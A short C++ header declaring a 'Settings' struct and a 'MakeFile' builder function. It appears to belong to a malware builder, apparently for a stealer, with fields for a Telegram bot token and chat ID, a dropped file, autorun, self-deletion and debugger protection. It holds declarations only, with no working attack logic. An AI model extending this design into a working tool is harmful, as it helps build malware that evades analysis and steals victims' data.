#pragma once
#ifndef BUILDER_H
#define BUILDER_H
#include "common.h"

#pragma pack(push, 1)
struct Settings {
	char botapi[128] = { 0 };
	char chatid[128] = { 0 };
	char drop[128] = { 0 };
	char autorun[128] = { 0 };
	char client_delay[128] = { 0 };
	bool auto_delete;
	bool autorun_state;
	bool drop_run;
	bool protect_debuggers;
};
#pragma pack(pop)

BOOL MakeFile(const char* stub, const char* output, Settings*);

#endif